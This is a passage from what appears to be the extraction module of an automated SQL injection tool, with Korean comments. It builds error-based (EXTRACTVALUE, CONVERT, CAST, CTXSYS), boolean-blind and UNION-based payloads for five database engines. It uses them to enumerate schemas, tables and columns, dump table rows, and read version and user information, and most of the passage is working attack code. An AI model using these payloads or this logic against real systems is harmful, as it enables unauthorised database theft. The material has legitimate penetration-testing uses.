    """Error-based 페이로드 빌더 — 응답 본문 충돌 회피용 랜덤 마커 prefix/suffix.

    DBMS별 에러 강제 함수:
    - MySQL/MariaDB: EXTRACTVALUE + 0x7e('~') prefix
    - MSSQL: CONVERT(int, ...)
    - PostgreSQL: CAST(... AS int)
    - Oracle: CTXSYS.DRITHSX.SN
    - SQLite: 미지원 (UnsupportedTechniqueError)

    마커(ml, mr)를 CHAR/CHR 함수로 인코딩해 echo 환경에서의 오탐을 차단한다.
    응답 echo 영역엔 CHAR(103,...) SQL 표현식만 노출되고, 에러 메시지엔 디코드된
    마커가 나타나 regex가 정확히 에러 결과만 매칭한다.

    마커는 gen_marker() 공용 함수의 고유 suffix(2자)만 재사용해 3자로 축소한다.
    EXTRACTVALUE 32 byte 한계에서 오버헤드(0x7e + ml + mr = 7자)를 최소화하기 위함.
    gen_marker() 자체는 변경하지 않아 탐지 모듈·DBMS 자동탐지와 완전 격리된다.

    반환: (payload, ml, mr)
    """
    # 'g' prefix(비 hex 문자) + gen_marker() 고유 suffix 2자 = 3자 마커
    # 추출 데이터가 hex(0-9a-f)이므로 'g' prefix로 마커·데이터 경계 혼동 방지
    ml = "g" + gen_marker()[7:]
    mr = "g" + gen_marker()[7:]
    # CHAR/CHR 인코딩 — echo 영역과 에러 출력 영역을 구분
    ml_expr = _char_encode_str(ctx, ml)
    mr_expr = _char_encode_str(ctx, mr)
    qc = ctx.quote_context
    if ctx.dbms in ("MySQL", "MariaDB"):
        # 0x7e('~')를 CONCAT 첫 인자로 추가 — XPATH 문자열이 알파벳으로 시작하면
        # MySQL이 유효한 노드 경로로 해석해 에러가 발생하지 않는다.
        # 비 XPATH 문자인 '~'로 강제 에러를 유발해야 데이터가 에러 메시지로 노출됨.
        p = f"{qc} AND EXTRACTVALUE(1,CONCAT(0x7e,{ml_expr},({query}),{mr_expr})) -- "
    elif ctx.dbms == "MSSQL":
        p = f"{qc} AND 1=CONVERT(int,(SELECT CONCAT({ml_expr},({query}),{mr_expr}))) -- "
    elif ctx.dbms == "PostgreSQL":
        p = f"{qc} AND 1=CAST((SELECT {ml_expr}||({query})||{mr_expr}) AS int) -- "
    elif ctx.dbms == "Oracle":
        p = f"{qc} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT {ml_expr}||({query})||{mr_expr} FROM dual)) -- "
    elif ctx.dbms == "SQLite":
        raise UnsupportedTechniqueError("SQLite는 Error-based 미지원")
    else:
        raise UnsupportedTechniqueError(f"Error-based 미지원 DBMS: {ctx.dbms}")
    return p, ml, mr


def _extract_error_marker(text: str, ml: str, mr: str) -> Optional[str]:
    """DBMS 무관 단일 정규식으로 마커 사이 값 추출."""
    m = re.search(re.escape(ml) + r"(.*?)" + re.escape(mr), text, re.DOTALL)
    return m.group(1) if m else None


def _error_extract(ctx: ExtractCtx, query: str) -> Optional[str]:
    """Error-based 단발 추출 — query 결과를 마커 사이에 삽입해 응답에서 추출.

    반환값이 None이면 추출 실패 (마커 미반사 또는 응답 잘림).
    """
    payload, ml, mr = _build_error_payload(ctx, query)
    resp = _send(ctx, payload)
    return _extract_error_marker(resp.text, ml, mr)


def _extract_long_string(ctx: ExtractCtx, query: str) -> str:
    """Error-based 결과 길이 제한 회피 — HEX 인코딩 + SUBSTRING 청크 분할 추출.

    각 DBMS 에러 메시지 출력 한계를 우회하기 위해 HEX(=2배 길이)로 변환 후
    ERROR_CHUNK_HEX[dbms] 단위로 분할 추출하여 결합.
    """
    hex_expr = HEX_FUNCS[ctx.dbms].format(f"({query})")
    f = DBMS_FUNCS[ctx.dbms]
    chunk_len = ERROR_CHUNK_HEX[ctx.dbms]

    # 길이 추출 — _build_error_payload가 자동으로 (expr) 서브쿼리 감쌈
    length_raw = _error_extract(ctx, f"{f['length']}({hex_expr})")
    if length_raw is None:
        return ""
    try:
        total = int(length_raw.strip())
    except ValueError:
        return ""
    if total <= 0:
        return ""

    # 청크 분할 추출 — DBMS별 chunk_len 적용
    chunks: List[str] = []
    for offset in range(0, total, chunk_len):
        if ctx.cancelled:
            break
        chunk_query = f"{f['substr']}({hex_expr},{offset+1},{chunk_len})"
        chunk = _error_extract(ctx, chunk_query)
        if chunk is None:
            break
        chunks.append(chunk.strip())
    hex_str = "".join(chunks)
    return _decode_hex(ctx.dbms, hex_str)


# ── Boolean-blind 페이로드 / 추출 ───────────────────────────────────────────

def _build_blind_compare_payload(ctx: ExtractCtx, condition: str) -> str:
    """Boolean true/false 판정용 페이로드 — 종결 문자열 + AND (condition)."""
    return f"{ctx.quote_context} AND ({condition}) -- "


def _blind_compare(ctx: ExtractCtx, condition: str) -> bool:
    """condition이 DB에서 true 평가되는지 판정.

    1. AND (condition) 페이로드 발사 → resp
    2. 동적 마스킹 적용
    3. dual baseline (true_ref / false_ref) 사용 시: 둘과 sim 비교 후 가까운 쪽으로 분류
       단일 baseline fallback: similarity ≥ BLIND_SIM_THRESHOLD 이면 true

    응답에 페이로드 결과가 echo되어 byte 단위 변동이 있는 환경에서는 단일 baseline의
    임계값 비교가 경계에서 흔들리므로, dual baseline의 양방향 비교가 더 안정적.

    baseline_resp_text / true_ref_text / false_ref_text / dynamic_contexts는
    fingerprint(_capture_baseline) 시점에 이미 캡처됨.
    """
    payload = _build_blind_compare_payload(ctx, condition)
    resp = _send(ctx, payload)
    masked_resp = apply_dynamic_mask(resp.text, ctx.dynamic_contexts)

    # dual baseline 우선 사용 — true_ref / false_ref 모두 캡처됐을 때
    if ctx.true_ref_text is not None and ctx.false_ref_text is not None:
        masked_true = apply_dynamic_mask(ctx.true_ref_text, ctx.dynamic_contexts)
        masked_false = apply_dynamic_mask(ctx.false_ref_text, ctx.dynamic_contexts)
        sim_true = similarity(masked_resp, masked_true)
        sim_false = similarity(masked_resp, masked_false)
        return sim_true > sim_false

    # fallback: 단일 baseline 비교 (캡처 실패·미실행 환경)
    masked_base = apply_dynamic_mask(ctx.baseline_resp_text or "", ctx.dynamic_contexts)
    return similarity(masked_base, masked_resp) >= BLIND_SIM_THRESHOLD


def _blind_int(ctx: ExtractCtx, expr: str, max_value: int = 1_000_000) -> Optional[int]:
    """이분 탐색으로 정수값 추출 — 길이/카운트 등.

    expr이 NULL이면 None, 0이면 0, max_value 도달 시 max_value(상한 도달 안내).
    """
    if _blind_compare(ctx, f"({expr}) IS NULL"):
        return None
    if _blind_compare(ctx, f"({expr})=0"):
        return 0

    # 상한 탐색 — 2배씩 증가
    upper = 1
    while not _blind_compare(ctx, f"({expr})<{upper}"):
        upper *= 2
        if upper > max_value:
            return max_value

    # 이분 탐색
    lo, hi = upper // 2, upper
    while lo < hi - 1:
        if ctx.cancelled:
            break
        mid = (lo + hi) // 2
        if _blind_compare(ctx, f"({expr})<{mid}"):
            hi = mid
        else:
            lo = mid
    return lo


def _blind_char_in_range(ctx: ExtractCtx, hex_expr: str, pos: int,
                         lo: int = 48, hi: int = 70) -> int:
    """HEX 문자 한 글자 ASCII 코드 이분탐색 (기본 범위 0-9A-F = 48~70)."""
    f = DBMS_FUNCS[ctx.dbms]
    char_expr = f"{f['ascii']}({f['substr']}({hex_expr},{pos},1))"
    while lo < hi:
        if ctx.cancelled:
            return lo
        mid = (lo + hi) // 2
        if _blind_compare(ctx, f"({char_expr})<={mid}"):
            hi = mid
        else:
            lo = mid + 1
    return lo


def _blind_string(ctx: ExtractCtx, query: str, max_bytes: int = 1_000_000) -> Optional[str]:
    """HEX 인코딩으로 multi-byte 안전 추출.

    - 한글/일본어/이모지 안전: HEX 결과는 ASCII 0-9A-F만이므로 글자당 약 5요청.
    - NULL이면 None, 길이 0이면 빈 문자열, 부분 결과(취소·timeout)도 디코드 시도.
    """
    if _blind_compare(ctx, f"({query}) IS NULL"):
        return None
    hex_expr = HEX_FUNCS[ctx.dbms].format(f"({query})")
    f = DBMS_FUNCS[ctx.dbms]
    hex_len = _blind_int(ctx, f"{f['length']}({hex_expr})", max_value=max_bytes * 2)
    if hex_len is None or hex_len == 0:
        return "" if hex_len == 0 else None

    hex_str = ""
    for pos in range(1, hex_len + 1):
        if ctx.cancelled:
            break
        ch_code = _blind_char_in_range(ctx, hex_expr, pos)
        hex_str += chr(ch_code)
    return _decode_hex(ctx.dbms, hex_str)


# ── UNION-based 페이로드 / 추출 ─────────────────────────────────────────────

def _build_union_payload(ctx: ExtractCtx, query: str) -> str:
    """UNION-based 페이로드 — visible 컬럼 위치에 마커로 감싼 query 주입.

    union_hex=True이면 query 결과를 HEX_FUNCS로 감싸 multibyte 안전 추출.
    문자열 연결 연산자는 DBMS별로 분기 (MySQL/MariaDB는 CONCAT, MSSQL은 +, 그 외는 ||).
    marker는 CHAR/CHR로 인코딩해 응답 echo 환경에서도 렌더링 결과만 정확히 매칭.
    """
    if ctx.union_hex:
        wrapped = HEX_FUNCS[ctx.dbms].format(f"({query})")
    else:
        wrapped = f"({query})"

    mark_s = _char_encode_str(ctx, UNION_MARK_S)
    mark_e = _char_encode_str(ctx, UNION_MARK_E)

    if ctx.dbms in ("MySQL", "MariaDB"):
        visible_expr = f"CONCAT({mark_s},{wrapped},{mark_e})"
    elif ctx.dbms == "MSSQL":
        visible_expr = f"({mark_s}+CAST({wrapped} AS NVARCHAR(MAX))+{mark_e})"
    else:
        # PostgreSQL / Oracle / SQLite: || 연결
        visible_expr = f"{mark_s}||{wrapped}||{mark_e}"

    parts = []
    for i in range(ctx.union_columns):
        if i == ctx.union_visible_idx:
            parts.append(visible_expr)
        else:
            # 컬럼별 타입 더미 — 앱의 정수 파싱 오류 방지 + MSSQL 형식 충돌 방지
            col_type = ctx.union_types[i] if i < len(ctx.union_types) else ""
            parts.append(_placeholder_literal(ctx, col_type))
    # AND 1=0으로 원본 row 제거 — 단일-row 렌더링 환경에서 UNION row만 결과로 남김
    return f"{ctx.quote_context} AND 1=0 UNION SELECT {','.join(parts)} -- "


def _union_extract(ctx: ExtractCtx, query: str) -> Optional[str]:
    """UNION 응답에서 visible 컬럼 값 추출.

    union_hex=True이면 추출된 HEX를 _decode_hex로 디코드.
    """
    payload = _build_union_payload(ctx, query)
    resp = _send(ctx, payload)
    m = re.search(re.escape(UNION_MARK_S) + r"(.*?)" + re.escape(UNION_MARK_E),
                  resp.text, re.DOTALL)
    if not m:
        return None
    raw = m.group(1)
    return _decode_hex(ctx.dbms, raw) if ctx.union_hex else raw


# ── 통합 단일 값 추출 (technique 라우팅) ────────────────────────────────────

def _extract_single(ctx: ExtractCtx, query: str) -> Optional[str]:
    """ctx.technique에 따라 적절한 단발 추출 함수로 라우팅.

    Error-based는 길이가 큰 결과를 위해 _extract_long_string 사용.
    """
    if ctx.technique == "error":
        return _extract_long_string(ctx, query)
    elif ctx.technique == "boolean":
        return _blind_string(ctx, query)
    elif ctx.technique == "union":
        return _union_extract(ctx, query)
    else:
        raise UnsupportedTechniqueError(f"Unknown technique: {ctx.technique}")


def _extract_int(ctx: ExtractCtx, query: str) -> Optional[int]:
    """정수 결과 추출 — Boolean은 _blind_int 직접 사용, 그 외는 단발 추출 후 int 변환."""
    if ctx.technique == "boolean":
        return _blind_int(ctx, f"({query})")
    val = _extract_single(ctx, query)
    if val is None:
        return None
    try:
        return int(val.strip())
    except (ValueError, AttributeError):
        return None


# ── 메타 쿼리 빌더 ───────────────────────────────────────────────────────────

def _q_count_databases(dbms: str) -> str:
    if dbms in ("MySQL", "MariaDB"):
        return "SELECT COUNT(*) FROM information_schema.schemata"
    if dbms == "MSSQL":
        return "SELECT COUNT(*) FROM master.sys.databases"
    if dbms == "PostgreSQL":
        return "SELECT COUNT(*) FROM pg_database"
    if dbms == "Oracle":
        return "SELECT COUNT(*) FROM all_users"
    if dbms == "SQLite":
        return "SELECT 1"  # SQLite는 단일 DB → 'main'만 반환
    raise UnsupportedTechniqueError(f"DB count 미지원 DBMS: {dbms}")


def _q_row_databases(dbms: str, n: int) -> str:
    if dbms in ("MySQL", "MariaDB"):
        return f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {n}"
    if dbms == "MSSQL":
        return (f"SELECT name FROM master.sys.databases ORDER BY name "
                f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
    if dbms == "PostgreSQL":
        return f"SELECT datname FROM pg_database ORDER BY datname LIMIT 1 OFFSET {n}"
    if dbms == "Oracle":
        return ("SELECT username FROM (SELECT username,ROW_NUMBER() OVER "
                f"(ORDER BY username) rn FROM all_users) WHERE rn={n+1}")
    if dbms == "SQLite":
        return "SELECT 'main'"
    raise UnsupportedTechniqueError(f"DB row 미지원 DBMS: {dbms}")


def _q_base_databases(dbms: str) -> str:
    """DB 목록 기본 SELECT — 결과 컬럼을 itm으로 alias, ORDER BY 포함 (Oracle 제외).

    _q_batch_list가 이 쿼리를 서브쿼리로 감싸 LIMIT/OFFSET 또는 ROW_NUMBER로 윈도우 처리.
    Oracle은 서브쿼리 내 ORDER BY 제약으로 ORDER BY 미포함 — _q_batch_list가 ROW_NUMBER 적용.
    """
    if dbms in ("MySQL", "MariaDB"):
        return "SELECT schema_name AS itm FROM information_schema.schemata ORDER BY schema_name"
    if dbms == "MSSQL":
        return "SELECT name AS itm FROM master.sys.databases ORDER BY name"
    if dbms == "PostgreSQL":
        return "SELECT datname AS itm FROM pg_database ORDER BY datname"
    if dbms == "Oracle":
        return "SELECT username AS itm FROM all_users"
    raise UnsupportedTechniqueError(f"DB base select 미지원 DBMS: {dbms}")


def _q_count_tables(dbms: str, db: str) -> str:
    if dbms in ("MySQL", "MariaDB"):
        return f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db}'"
    if dbms == "MSSQL":
        return f"SELECT COUNT(*) FROM [{db}].sys.tables"
    if dbms == "PostgreSQL":
        return f"SELECT COUNT(*) FROM pg_tables WHERE schemaname='{db}'"
    if dbms == "Oracle":
        return f"SELECT COUNT(*) FROM all_tables WHERE owner='{db}'"
    if dbms == "SQLite":
        return "SELECT COUNT(*) FROM sqlite_master WHERE type='table'"
    raise UnsupportedTechniqueError(f"Table count 미지원 DBMS: {dbms}")


def _q_row_tables(dbms: str, db: str, n: int) -> str:
    if dbms in ("MySQL", "MariaDB"):
        return (f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='{db}' LIMIT 1 OFFSET {n}")
    if dbms == "MSSQL":
        return (f"SELECT name FROM [{db}].sys.tables ORDER BY name "
                f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
    if dbms == "PostgreSQL":
        return (f"SELECT tablename FROM pg_tables WHERE schemaname='{db}' "
                f"LIMIT 1 OFFSET {n}")
    if dbms == "Oracle":
        return ("SELECT table_name FROM (SELECT table_name,ROW_NUMBER() OVER "
                f"(ORDER BY table_name) rn FROM all_tables WHERE owner='{db}') "
                f"WHERE rn={n+1}")
    if dbms == "SQLite":
        return f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {n}"
    raise UnsupportedTechniqueError(f"Table row 미지원 DBMS: {dbms}")


def _q_base_tables(dbms: str, db: str) -> str:
    """테이블 목록 기본 SELECT — 결과 컬럼을 itm으로 alias (Oracle은 ORDER BY 미포함)."""
    if dbms in ("MySQL", "MariaDB"):
        return (f"SELECT table_name AS itm FROM information_schema.tables "
                f"WHERE table_schema='{db}' ORDER BY table_name")
    if dbms == "MSSQL":
        return f"SELECT name AS itm FROM [{db}].sys.tables ORDER BY name"
    if dbms == "PostgreSQL":
        return (f"SELECT tablename AS itm FROM pg_tables "
                f"WHERE schemaname='{db}' ORDER BY tablename")
    if dbms == "Oracle":
        return f"SELECT table_name AS itm FROM all_tables WHERE owner='{db}'"
    if dbms == "SQLite":
        return "SELECT name AS itm FROM sqlite_master WHERE type='table' ORDER BY name"
    raise UnsupportedTechniqueError(f"Table base select 미지원 DBMS: {dbms}")


def _q_count_columns(dbms: str, db: str, tbl: str) -> str:
    if dbms in ("MySQL", "MariaDB"):
        return (f"SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{tbl}'")
    if dbms == "MSSQL":
        return (f"SELECT COUNT(*) FROM [{db}].sys.columns c "
                f"JOIN [{db}].sys.tables t ON c.object_id=t.object_id "
                f"WHERE t.name='{tbl}'")
    if dbms == "PostgreSQL":
        return (f"SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{tbl}'")
    if dbms == "Oracle":
        return (f"SELECT COUNT(*) FROM all_tab_columns "
                f"WHERE owner='{db}' AND table_name='{tbl}'")
    if dbms == "SQLite":
        # PRAGMA는 일반 SELECT처럼 쓰기 어려움 → sqlite_master의 sql 컬럼 파싱 대신
        # pragma_table_info 테이블 함수 사용 (SQLite 3.16+)
        return f"SELECT COUNT(*) FROM pragma_table_info('{tbl}')"
    raise UnsupportedTechniqueError(f"Column count 미지원 DBMS: {dbms}")


def _q_row_columns(dbms: str, db: str, tbl: str, n: int) -> str:
    if dbms in ("MySQL", "MariaDB"):
        return (f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{tbl}' "
                f"LIMIT 1 OFFSET {n}")
    if dbms == "MSSQL":
        return (f"SELECT c.name FROM [{db}].sys.columns c "
                f"JOIN [{db}].sys.tables t ON c.object_id=t.object_id "
                f"WHERE t.name='{tbl}' ORDER BY c.column_id "
                f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
    if dbms == "PostgreSQL":
        return (f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{tbl}' "
                f"ORDER BY ordinal_position LIMIT 1 OFFSET {n}")
    if dbms == "Oracle":
        return ("SELECT column_name FROM (SELECT column_name,ROW_NUMBER() "
                "OVER (ORDER BY column_id) rn FROM all_tab_columns "
                f"WHERE owner='{db}' AND table_name='{tbl}') WHERE rn={n+1}")
    if dbms == "SQLite":
        return f"SELECT name FROM pragma_table_info('{tbl}') LIMIT 1 OFFSET {n}"
    raise UnsupportedTechniqueError(f"Column row 미지원 DBMS: {dbms}")


def _q_base_columns(dbms: str, db: str, tbl: str) -> str:
    """컬럼 목록 기본 SELECT — 결과 컬럼을 itm으로 alias (Oracle은 ORDER BY 미포함)."""
    if dbms in ("MySQL", "MariaDB"):
        return (f"SELECT column_name AS itm FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{tbl}' "
                f"ORDER BY ordinal_position")
    if dbms == "MSSQL":
        return (f"SELECT c.name AS itm FROM [{db}].sys.columns c "
                f"JOIN [{db}].sys.tables t ON c.object_id=t.object_id "
                f"WHERE t.name='{tbl}' ORDER BY c.column_id")
    if dbms == "PostgreSQL":
        return (f"SELECT column_name AS itm FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{tbl}' "
                f"ORDER BY ordinal_position")
    if dbms == "Oracle":
        return (f"SELECT column_name AS itm FROM all_tab_columns "
                f"WHERE owner='{db}' AND table_name='{tbl}'")
    if dbms == "SQLite":
        return f"SELECT name AS itm FROM pragma_table_info('{tbl}') ORDER BY cid"
    raise UnsupportedTechniqueError(f"Column base select 미지원 DBMS: {dbms}")


def _q_batch_list(ctx: ExtractCtx, base_select: str, offset: int, batch: int) -> str:
    """목록 UNION 묶음 추출 쿼리 — base_select 서브쿼리를 집계해 ROW_DELIM으로 결합.

    base_select는 _q_base_* 계열 함수의 결과 (itm alias 포함).
    MSSQL은 base_select의 ORDER BY에 OFFSET/FETCH를 이어 붙여 파생 테이블로 감싼다.
    Oracle은 base_select에 ORDER BY가 없으므로 ROW_NUMBER() OVER (ORDER BY itm)로 윈도우.
    기타 DBMS는 base_select를 서브쿼리로 감싸고 LIMIT/OFFSET 추가.
    """
    delim = ROW_DELIM
    if ctx.dbms in ("MySQL", "MariaDB"):
        return (f"SELECT GROUP_CONCAT(itm SEPARATOR '{delim}') "
                f"FROM ({base_select} LIMIT {batch} OFFSET {offset}) sub")
    if ctx.dbms == "MSSQL":
        # base_select 끝의 ORDER BY에 OFFSET/FETCH를 직접 이어붙임 — 파생 테이블에서 유효
        return (f"SELECT STRING_AGG(CAST(itm AS NVARCHAR(MAX)),'{delim}') "
                f"FROM ({base_select} "
                f"OFFSET {offset} ROWS FETCH NEXT {batch} ROWS ONLY) sub")
    if ctx.dbms == "PostgreSQL":
        return (f"SELECT STRING_AGG(itm,'{delim}') "
                f"FROM ({base_select} LIMIT {batch} OFFSET {offset}) sub")
    if ctx.dbms == "Oracle":
        # ROW_NUMBER() OVER (ORDER BY itm)으로 윈도우 — base_select에 ORDER BY 불필요
        return ("SELECT LISTAGG(itm,'" + delim + "') WITHIN GROUP (ORDER BY rn) "
                f"FROM (SELECT itm,ROW_NUMBER() OVER (ORDER BY itm) rn "
                f"FROM ({base_select})) "
                f"WHERE rn>{offset} AND rn<={offset+batch}")
    if ctx.dbms == "SQLite":
        return (f"SELECT GROUP_CONCAT(itm,'{delim}') "
                f"FROM ({base_select} LIMIT {batch} OFFSET {offset}) sub")
    raise UnsupportedTechniqueError(f"batch list 미지원 DBMS: {ctx.dbms}")


def _build_row_select(ctx: ExtractCtx, columns: List[str]) -> str:
    """행 단위 추출용 row_select 표현 — NULL-safe 변환 + DUMP_DELIM 결합.

    각 컬럼은 DBMS별 NULL-safe 함수로 감싼 뒤, DUMP_DELIM(qDLMTRq)로 결합.
    호출부는 결과 문자열을 .split(DUMP_DELIM)으로 컬럼 분리.

    주의: MSSQL은 CONCAT_WS가 2017+ 가정 (v1 한계).
    """
    delim = DUMP_DELIM
    qcols = [_qid(ctx, c) for c in columns]
    if ctx.dbms in ("MySQL", "MariaDB"):
        wrapped = [f"IFNULL({c},'NULL')" for c in qcols]
        return f"CONCAT_WS('{delim}',{','.join(wrapped)})"
    if ctx.dbms == "MSSQL":
        wrapped = [f"ISNULL(CAST({c} AS NVARCHAR(MAX)),'NULL')" for c in qcols]
        return f"CONCAT_WS('{delim}',{','.join(wrapped)})"
    if ctx.dbms == "PostgreSQL":
        wrapped = [f"COALESCE({c}::text,'NULL')" for c in qcols]
        return f"CONCAT_WS('{delim}',{','.join(wrapped)})"
    if ctx.dbms == "Oracle":
        wrapped = [f"NVL(TO_CHAR({c}),'NULL')" for c in qcols]
        joiner = f"||'{delim}'||"
        return joiner.join(wrapped)
    if ctx.dbms == "SQLite":
        wrapped = [f"IFNULL({c},'NULL')" for c in qcols]
        joiner = f"||'{delim}'||"
        return joiner.join(wrapped)
    raise UnsupportedTechniqueError(f"row_select 미지원 DBMS: {ctx.dbms}")


def _q_row_dump(ctx: ExtractCtx, db: str, tbl: str, row_select: str, n: int) -> str:
    """행 단위 추출 쿼리 — DBMS별 페이지네이션 + row_select 결합."""
    qdb = _qid(ctx, db)
    qtbl = _qid(ctx, tbl)
    if ctx.dbms in ("MySQL", "MariaDB"):
        return f"SELECT {row_select} FROM {qdb}.{qtbl} LIMIT 1 OFFSET {n}"
    if ctx.dbms == "MSSQL":
        return (f"SELECT {row_select} FROM {qdb}.dbo.{qtbl} "
                f"ORDER BY (SELECT 1) OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
    if ctx.dbms == "PostgreSQL":
        return (f"SELECT {row_select} FROM {qdb}.{qtbl} "
                f"LIMIT 1 OFFSET {n}")
    if ctx.dbms == "Oracle":
        return ("SELECT col FROM (SELECT " + row_select + " AS col,"
                "ROW_NUMBER() OVER (ORDER BY ROWNUM) rn "
                f"FROM {qdb}.{qtbl}) WHERE rn={n+1}")
    if ctx.dbms == "SQLite":
        return f"SELECT {row_select} FROM {qtbl} LIMIT 1 OFFSET {n}"
    raise UnsupportedTechniqueError(f"row dump 미지원 DBMS: {ctx.dbms}")


def _q_row_dump_batch(ctx: ExtractCtx, db: str, tbl: str, row_select: str,
                      offset: int, batch: int) -> str:
    """UNION 묶음 행 추출 쿼리 — DBMS별 집계 함수로 batch 행을 ROW_DELIM으로 결합.

    기존 _q_row_dump를 서브쿼리로 감싸 집계하는 방식으로, _build_row_select 재사용.
    집계 결과가 한 셀에 담기므로 _build_union_payload/HEX 추출 경로를 그대로 사용 가능.
    MySQL 1024B·Oracle 4000B 한계 초과 시 _union_extract가 None 반환 → 호출부 폴백.
    """
    qdb = _qid(ctx, db)
    qtbl = _qid(ctx, tbl)
    delim = ROW_DELIM
    if ctx.dbms in ("MySQL", "MariaDB"):
        # GROUP_CONCAT 기본 1024B 한계 — 초과 시 조용히 잘림 → 행 수 부족으로 폴백 탐지
        return (f"SELECT GROUP_CONCAT(r SEPARATOR '{delim}') "
                f"FROM (SELECT {row_select} AS r "
                f"FROM {qdb}.{qtbl} LIMIT {batch} OFFSET {offset}) sub")
    if ctx.dbms == "MSSQL":
        # STRING_AGG은 SQL Server 2017+(v14) 이상 필요 — 이하 버전은 None 반환 → 폴백
        return (f"SELECT STRING_AGG(CAST(r AS NVARCHAR(MAX)),'{delim}') "
                f"FROM (SELECT {row_select} AS r FROM {qdb}.dbo.{qtbl} "
                f"ORDER BY (SELECT 1) "
                f"OFFSET {offset} ROWS FETCH NEXT {batch} ROWS ONLY) sub")
    if ctx.dbms == "PostgreSQL":
        return (f"SELECT STRING_AGG(r,'{delim}') "
                f"FROM (SELECT {row_select} AS r "
                f"FROM {qdb}.{qtbl} LIMIT {batch} OFFSET {offset}) sub")
    if ctx.dbms == "Oracle":
        # LISTAGG는 4000B 초과 시 ORA-01489 에러 → _union_extract None → 폴백
        return ("SELECT LISTAGG(r,'" + delim + "') WITHIN GROUP (ORDER BY rn) "
                f"FROM (SELECT {row_select} AS r,"
                f"ROW_NUMBER() OVER (ORDER BY ROWNUM) rn "
                f"FROM {qdb}.{qtbl}) "
                f"WHERE rn>{offset} AND rn<={offset+batch}")
    if ctx.dbms == "SQLite":
        return (f"SELECT GROUP_CONCAT(r,'{delim}') "
                f"FROM (SELECT {row_select} AS r "
                f"FROM {qtbl} LIMIT {batch} OFFSET {offset})")
    raise UnsupportedTechniqueError(f"batch row dump 미지원 DBMS: {ctx.dbms}")


def _parse_row_raw(raw: Optional[str], col_count: int) -> List[str]:
    """원시 행 문자열을 DUMP_DELIM 기준으로 분리 + 컬럼 수 맞춤.

    None이면 빈 값 리스트, 컬럼 수 불일치는 패딩/마지막 컬럼 합침으로 보정.
    """
    if raw is None:
        return [""] * col_count
    parts = raw.split(DUMP_DELIM)
    if len(parts) < col_count:
        parts = parts + [""] * (col_count - len(parts))
    elif len(parts) > col_count:
        parts = parts[:col_count - 1] + [DUMP_DELIM.join(parts[col_count - 1:])]
    return parts


# ── 공개 추출 함수 ──────────────────────────────────────────────────────────

def extract_dbms_info(ctx: ExtractCtx,
                      progress_cb: Optional[Callable[[int, int], None]] = None
                      ) -> Dict[str, str]:
    """버전 / 현재 사용자 / 현재 DB 추출."""
    info: Dict[str, str] = {}
    queries = _dbms_info_queries(ctx.dbms)
    total = len(queries)
    for i, (key, q) in enumerate(queries):
        if ctx.cancelled:
            break
        try:
            val = _extract_single(ctx, q)
        except WAFBlockedError:
            raise
        except Exception:
            val = None
        info[key] = val if val is not None else ""
        if progress_cb:
            progress_cb(i + 1, total)

    # 안전망 — smoke test 우회 경로 대비: 모든 값이 빈 문자열이면 추출 불가 에러
    if not ctx.cancelled and all(not v for v in info.values()):
        _label = _TECHNIQUE_LABELS.get(ctx.technique, ctx.technique)
        raise UnsupportedTechniqueError(f"{_label} 기법으로 추출할 수 없습니다.")
    return info


def _dbms_info_queries(dbms: str) -> List[Tuple[str, str]]:
    """DBMS별 (version, user, current_db) 추출 쿼리."""
    if dbms in ("MySQL", "MariaDB"):
        return [("version", "SELECT VERSION()"),
                ("user",    "SELECT CURRENT_USER()"),
                ("current_db", "SELECT DATABASE()")]
    if dbms == "MSSQL":
        return [("version", "SELECT @@VERSION"),
                ("user",    "SELECT SYSTEM_USER"),
                ("current_db", "SELECT DB_NAME()")]
    if dbms == "PostgreSQL":
        return [("version", "SELECT VERSION()"),
                ("user",    "SELECT CURRENT_USER"),
                ("current_db", "SELECT CURRENT_DATABASE()")]
    if dbms == "Oracle":
        return [("version", "SELECT banner FROM v$version WHERE rownum=1"),
                ("user",    "SELECT USER FROM dual"),
                ("current_db", "SELECT ora_database_name FROM dual")]
    if dbms == "SQLite":
        return [("version", "SELECT sqlite_version()"),
                ("user",    "SELECT 'sqlite'"),
                ("current_db", "SELECT 'main'")]
    return []


def _list_items_batch(ctx: ExtractCtx, cnt: int, base_select: str,
                      progress_cb: Optional[Callable[[int, int], None]] = None
                      ) -> List[str]:
    """UNION 묶음 목록 추출 — _q_batch_list를 윈도우 단위로 호출 + 폴백.

    묶음 실패(None) 또는 잘림(got < window) 시 해당 구간을 window=1로 재추출.
    window=1 폴백은 이름이 짧아 집계 길이 한계를 절대 초과하지 않으므로 안전.
    """
    items: List[str] = []
    batch = ctx.union_row_batch
    n = 0
    while n < cnt:
        if ctx.cancelled:
            break
        window = min(batch, cnt - n)

        try:
            raw_batch = _union_extract(ctx, _q_batch_list(ctx, base_select, n, window))
        except WAFBlockedError:
            raise
        except InterruptedError:
            raise
        except Exception:
            raw_batch = None

        if raw_batch is None:
            # 윈도우 전체 window=1 폴백
            for i in range(n, n + window):
                if ctx.cancelled:
                    break
                try:
                    raw = _union_extract(ctx, _q_batch_list(ctx, base_select, i, 1))
                except WAFBlockedError:
                    raise
                except InterruptedError:
                    raise
                except Exception:
                    raw = None
                if raw is not None:
                    items.append(raw.strip())
                if progress_cb:
                    progress_cb(i + 1, cnt)
            n += window
            continue

        # 묶음 결과 분리
        raw_items = raw_batch.split(ROW_DELIM)
        got = len(raw_items)

        for ri, item in enumerate(raw_items[:window]):
            if ctx.cancelled:
                break
            stripped = item.strip()
            if stripped:
                items.append(stripped)
            if progress_cb:
                progress_cb(n + ri + 1, cnt)

        # 잘림 감지 — 나머지 구간 window=1 폴백
        if got < window:
            for i in range(n + got, n + window):
                if ctx.cancelled:
